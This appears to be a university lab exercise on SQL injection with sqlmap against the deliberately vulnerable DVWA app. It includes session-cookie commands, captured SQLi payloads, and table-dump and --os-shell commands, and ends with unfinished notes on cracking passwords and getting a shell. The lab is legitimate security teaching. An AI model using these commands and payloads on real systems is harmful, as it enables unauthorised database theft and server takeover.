# <img src="https://www.tamusa.edu/brandguide/jpeglogos/tamusa_final_logo_bw1.jpg" width="100" height="50"> SQLi with sqlmap

## sqlmap Overview

sqlmap is an automated open source tool that detects and exploits SQLi vulnerabilities. It supports SQLi against both popular SQL DBMS's (i.e., MySQL, Oracle, Postgresql, MS-SQL and SQLite) and less popular DBMS's (i.e., TiDB, FrontBase, CrateDB and Virtuoso). sqlmap can automate an entire SQLi attack from DBMS detection, SQLi vulnerabilitiy detection, user and database detection, dumping tables, and gaining SQL or  system shells.

Additional sqlmap documentation can be found at [sqlmap.org](https://sqlmap.org/).

This exercise uses DVWA for testing. Ensure you have Metasploitable2 running and can connect to DVWA.

## SQLi Attack using sqlmap

### Challenge 1: Application Authentication and sqlmap

sqlmap supports use of cookies for applications that use session IDs for authentication. DVWA requires user authentication. Using Burp Suite, login to DVWA, browse to the SQL Injection page and enter User ID **1** into form. Click **submit**. A sample GET request from DVWA's SQL Injection page is shown below.

```
GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: 34.171.165.162:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://34.171.165.162:8000/dvwa/vulnerabilities/sqli/
Cookie: security=low; PHPSESSID=4ae7cff151a35773cb6253368001f1f6
Upgrade-Insecure-Requests: 1

```

The GET request includes two cookies, security=low and PHPSESSID=4ae7cff151a35773cb6253368001f1f6. Access to the page _sqli_ requires authentication. Therefore, the two cookies must be included when running sqlmap against this page. Two techniques can be used. The first technique includes cookies in the sqlmap command with the **--cookie** option. See the example below.

```
sqlmap -u "http://34.171.165.162:8000/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=4ae7cff151a35773cb6253368001f1f6"

                                 
        ___
       __H__                                                                            
 ___ ___[)]_____ ___ ___  {1.6.7#stable}                                                
|_ -| . [.]     | .'| . |                                                               
|___|_  [']_|_|_|__,|  _|                                                               
      |_|V...       |_|   https://sqlmap.org                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:41:25 /2022-11-07/

[11:41:25] [INFO] parsing HTTP request from 'dvwa.txt'
[11:41:25] [INFO] resuming back-end DBMS 'mysql' 
[11:41:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 3165=3165#&Submit=Submit

    Type: error-based
    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND ROW(2541,9538)>(SELECT COUNT(*),CONCAT(0x7171707171,(SELECT (ELT(2541=2541,1))),0x7176706271,FLOOR(RAND(0)*2))x FROM (SELECT 9918 UNION SELECT 5520 UNION SELECT 6131 UNION SELECT 3426)a GROUP BY x)-- tefw&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6324 FROM (SELECT(SLEEP(5)))Gmex)-- LYhW&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7171707171,0x61434154445452584e58456b4e516d7143734a756b5444616f6f7a486d547779735a6c7479467871,0x7176706271),NULL#&Submit=Submit
---
[11:41:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL >= 4.1
[11:41:26] [INFO] fetched data logged to text files under '/home/kbarton/.local/share/sqlmap/output/34.171.165.162'                                                             

[*] ending @ 11:41:26 /2022-11-07/
```

**Capture a screenshot of a simple sqlmap attack against DVWA's SQL Injection page with cookies included using --cookie option.**

The second technique is to save the GET request from Burp Suite to a file and read the file into sqlmap. See the folloiwng example. The GET request, with cookies, is stored in dvwa.txt and read into sqlmap using the **-r** option.

```
sqlmap -r dvwa.txt 
        ___
       __H__                                                                            
 ___ ___[(]_____ ___ ___  {1.6.7#stable}                                                
|_ -| . [,]     | .'| . |                                                               
|___|_  ["]_|_|_|__,|  _|                                                               
      |_|V...       |_|   https://sqlmap.org                                            

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:50:08 /2022-11-07/

[11:50:08] [INFO] parsing HTTP request from 'dvwa.txt'
[11:50:08] [INFO] resuming back-end DBMS 'mysql' 
[11:50:08] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 3165=3165#&Submit=Submit

    Type: error-based
    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND ROW(2541,9538)>(SELECT COUNT(*),CONCAT(0x7171707171,(SELECT (ELT(2541=2541,1))),0x7176706271,FLOOR(RAND(0)*2))x FROM (SELECT 9918 UNION SELECT 5520 UNION SELECT 6131 UNION SELECT 3426)a GROUP BY x)-- tefw&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6324 FROM (SELECT(SLEEP(5)))Gmex)-- LYhW&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x7171707171,0x61434154445452584e58456b4e516d7143734a756b5444616f6f7a486d547779735a6c7479467871,0x7176706271),NULL#&Submit=Submit
```

### Challenge 2: Dump Tables with sqlmap

sqlmap caches results. Cached results reduce the time to complete successive sqlmap commands when testing an application. However, there are times that using cached results is not desired. The sqlmap cache can be ignored using the option **--fresh-queries**. 

sqlmap -r dvwa.txt --dump --fresh-queries --os-shell

sqlmap -r dvwa.txt --dump

Crack passwords

sqlmap -r dvwa.txt --cookie="security=high; PHPSESSID=4ae7cff151a35773cb6253368001f1f6" --dump --fresh-queries --os-shell


Got the os-shell at /var/www/dav (has permissions: drwxrwxrwt  2 root     root      4096 May 20  2012 dav)
